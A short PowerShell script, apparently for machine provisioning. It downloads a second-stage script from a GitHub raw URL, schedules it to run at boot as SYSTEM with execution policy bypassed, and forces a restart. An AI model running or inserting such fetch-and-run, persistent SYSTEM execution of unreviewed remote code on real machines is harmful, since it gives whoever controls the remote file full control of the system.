$dst = "C:\Windows\Temp\stage2.ps1"
$task = "ProvisionUsersAtBoot"

Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/JMcKeiray/skrypty/refs/heads/main/stage2.ps1" `
  -OutFile $dst `
  -UseBasicParsing

schtasks /create `
 /tn $task `
 /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File $dst" `
 /sc onstart `
 /ru SYSTEM `
 /rl HIGHEST `
 /f

Restart-Computer -Force
